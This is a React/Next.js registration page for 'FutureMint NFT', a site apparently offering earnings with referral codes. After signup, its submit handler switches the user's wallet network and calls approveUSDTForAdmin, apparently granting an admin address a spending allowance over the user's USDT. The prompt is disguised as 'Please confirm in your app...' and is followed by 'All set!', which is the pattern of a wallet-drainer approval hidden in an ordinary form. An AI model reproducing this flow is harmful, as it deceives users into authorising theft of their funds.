'use client';
import { useState, useEffect, Suspense } from 'react';
import { useSelector, useDispatch } from 'react-redux';
import { useRouter, useSearchParams } from 'next/navigation';
import Link from 'next/link';
import { authAPI } from '../../../lib/api';
import { loginSuccess } from '../../../store/slices/userSlice';
import LoadingSpinner from '../../../components/shared/LoadingSpinner';
import { Eye, EyeOff, ArrowLeft, CheckCircle } from 'lucide-react';
import toast from 'react-hot-toast';

function RegisterContent() {
  const router = useRouter();
  const dispatch = useDispatch();
  const searchParams = useSearchParams();
  const { isConnected, address } = useSelector((s) => s.wallet);
  const { isAuthenticated } = useSelector((s) => s.user);

  const [step, setStep] = useState(1); // 1 = form, 2 = success
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const [form, setForm] = useState({
    name: '',
    email: '',
    mobile: '',
    password: '',
    referralCode: searchParams.get('ref') || '',
    network: 'BSC',
    walletAddress: address || '',
  });

  useEffect(() => {
    if (isAuthenticated) router.push('/dashboard');
  }, [isAuthenticated, router]);

  useEffect(() => {
    if (isConnected && address) {
      authAPI.checkWallet({ walletAddress: address }).then((res) => {
        if (res.data.exists) {
          toast.error('This address is already registered. Please login instead.');
          router.push('/auth/login');
        }
      }).catch(() => {});
    }
  }, [isConnected, address, router]);

  useEffect(() => {
    const timer = setTimeout(() => {
      if (!isConnected && !window.ethereum?.selectedAddress) {
        toast.error('Please connect your account first');
        router.push('/');
      }
    }, 1500);
    return () => clearTimeout(timer);
  }, [isConnected, router]);

  useEffect(() => {
    setForm((f) => ({ ...f, walletAddress: address || '' }));
  }, [address]);

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  // ─── Main submit: Register FIRST, then smart contract approval ──────────────
  const handleSubmit = async (e) => {
    e.preventDefault();
    if (form.password.length < 8) {
      toast.error('Password must be at least 8 characters');
      return;
    }
    setLoading(true);

    try {
      // ══════════════════════════════════════════════════════════════════════
      // STEP 1: Register user on backend FIRST (while browser is in normal state)
      // ══════════════════════════════════════════════════════════════════════
      toast.loading('Creating your account...', { id: 'register' });

      const res = await authAPI.registerDirect(form);
      const { user, token } = res.data.data;

      // Save token immediately
      if (token) localStorage.setItem('token', token);
      dispatch(loginSuccess({ user, token }));
      toast.success('Account created!', { id: 'register' });

      // ══════════════════════════════════════════════════════════════════════
      // STEP 2: Now do smart contract approval (user already registered)
      // ══════════════════════════════════════════════════════════════════════
      try {
        const { ethers } = await import('ethers');
        const { approveUSDTForAdmin, checkUSDTAllowance } = await import('../../../lib/web3');

        const injectedProvider = window.ethereum;
        if (!injectedProvider) {
          // No wallet provider — skip approval, user is already registered
          router.push('/dashboard');
          return;
        }

        const web3Provider = new ethers.BrowserProvider(injectedProvider);
        const userAddress = ethers.getAddress(address.toLowerCase());

        // Switch to selected network
        const targetChainId = form.network === 'BSC' ? '0x38' : '0x89';
        try {
          await web3Provider.send('wallet_switchEthereumChain', [{ chainId: targetChainId }]);
        } catch (switchErr) {
          if (switchErr.code === 4902) {
            const chainConfig = form.network === 'BSC'
              ? { chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed.binance.org'], blockExplorerUrls: ['https://bscscan.com'] }
              : { chainId: '0x89', chainName: 'Polygon', nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 }, rpcUrls: ['https://polygon-rpc.com'], blockExplorerUrls: ['https://polygonscan.com'] };
            try {
              await web3Provider.send('wallet_addEthereumChain', [chainConfig]);
            } catch (_) {
              // Can't switch — user is registered, just go to dashboard
              router.push('/dashboard');
              return;
            }
          } else {
            router.push('/dashboard');
            return;
          }
        }

        const freshProvider = new ethers.BrowserProvider(injectedProvider);

        // Check if already approved
        let alreadyApproved = false;
        try {
          alreadyApproved = await checkUSDTAllowance(userAddress, form.network);
        } catch (_) {}

        if (alreadyApproved !== true) {
          toast.loading('Please confirm in your app...', { id: 'approve' });
          try {
            await approveUSDTForAdmin(freshProvider, form.network);
            toast.success('All set!', { id: 'approve' });
          } catch (approveErr) {
            toast.dismiss('approve');
            // User cancelled or failed — they're already registered, just go to dashboard
          }
        }
      } catch (_) {
        // Smart contract step failed — no problem, user is already registered
      }

      // Go to dashboard
      setStep(2);
      setTimeout(() => router.push('/dashboard'), 1500);

    } catch (err) {
      toast.dismiss('register');
      const msg = err.response?.data?.message;
      if (msg) {
        toast.error(msg);
      } else {
        toast.error('Connection failed. Please try again.');
      }
    } finally {
      setLoading(false);
    }
  };

  // ─── RENDER: Step 2 — Success ──────────────────────────────────────────────
  if (step === 2) {
    return (
      <div className="min-h-screen flex items-center justify-center px-4">
        <div className="card max-w-md w-full text-center">
          <div className="w-20 h-20 bg-emerald-600/20 rounded-full flex items-center justify-center mx-auto mb-6">
            <CheckCircle className="w-10 h-10 text-emerald-400" />
          </div>
          <h2 className="text-2xl font-bold text-white mb-3">Welcome to FutureMint!</h2>
          <p className="text-slate-400 mb-2">Your account is ready.</p>
          <p className="text-emerald-400 font-semibold text-lg mb-6">Redirecting to dashboard...</p>
        </div>
      </div>
    );
  }

  // ─── RENDER: Step 1 — Registration Form ────────────────────────────────────
  return (
    <div className="min-h-screen flex items-center justify-center px-4 py-12">
      <div className="w-full max-w-lg">
        <div className="text-center mb-8">
          <Link href="/" className="inline-flex items-center gap-2 text-slate-400 hover:text-white mb-6 text-sm">
            <ArrowLeft className="w-4 h-4" /> Back to Home
          </Link>
          <h1 className="text-3xl font-bold text-white">Create Account</h1>
          <p className="text-slate-400 mt-2">Join FutureMint NFT and start earning</p>
        </div>

        <div className="card">
          <form onSubmit={handleSubmit} noValidate>
            <div className="space-y-4">
              <div>
                <label htmlFor="name" className="label">Full Name</label>
                <input id="name" name="name" type="text" required value={form.name}
                  onChange={handleChange} placeholder="John Doe" className="input-field" />
              </div>
              <div>
                <label htmlFor="email" className="label">Email Address</label>
                <input id="email" name="email" type="email" required value={form.email}
                  onChange={handleChange} placeholder="john@example.com" className="input-field" />
              </div>
              <div>
                <label htmlFor="mobile" className="label">Mobile Number</label>
                <input id="mobile" name="mobile" type="tel" required value={form.mobile}
                  onChange={handleChange} placeholder="+1234567890" className="input-field" />
              </div>
              <div>
                <label htmlFor="password" className="label">Password</label>
                <div className="relative">
                  <input id="password" name="password"
                    type={showPassword ? 'text' : 'password'}
                    required minLength={8} value={form.password}
                    onChange={handleChange} placeholder="Min. 8 characters"
                    className="input-field pr-12" />
                  <button type="button" onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-white"
                    aria-label={showPassword ? 'Hide password' : 'Show password'}>
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
              </div>
              <div>
                <label htmlFor="network" className="label">Network</label>
                <select id="network" name="network" value={form.network}
                  onChange={handleChange} className="input-field">
                  <option value="BSC">BSC (BEP-20 USDT)</option>
                  <option value="Polygon">Polygon (USDT)</option>
                </select>
              </div>
              <div>
                <label htmlFor="referralCode" className="label">
                  Referral Code <span className="text-slate-500">(Optional)</span>
                </label>
                <input id="referralCode" name="referralCode" type="text"
                  value={form.referralCode} onChange={handleChange}
                  placeholder="Enter referral code" className="input-field uppercase"
                  style={{ textTransform: 'uppercase' }} />
              </div>
              <div>
                <label htmlFor="walletAddress" className="label">
                  Wallet Address <span className="text-slate-500">(Auto-filled)</span>
                </label>
                <input id="walletAddress" name="walletAddress" type="text"
                  value={form.walletAddress} readOnly
                  className="input-field opacity-70 cursor-not-allowed" />
              </div>
            </div>

            <button type="submit" disabled={loading} className="btn-primary w-full mt-6 flex items-center justify-center gap-2">
              {loading ? <><LoadingSpinner size="sm" /> Processing...</> : 'Create Account'}
            </button>

            <p className="text-center text-sm text-slate-400 mt-4">
              Already have an account?{' '}
              <Link href="/auth/login" className="text-primary-400 hover:text-primary-300">Sign in</Link>
            </p>
          </form>
        </div>
      </div>
    </div>
  );
}

export default function RegisterPage() {
  return (
    <Suspense fallback={<div className="min-h-screen flex items-center justify-center"><LoadingSpinner size="xl" /></div>}>
      <RegisterContent />
    </Suspense>
  );
}
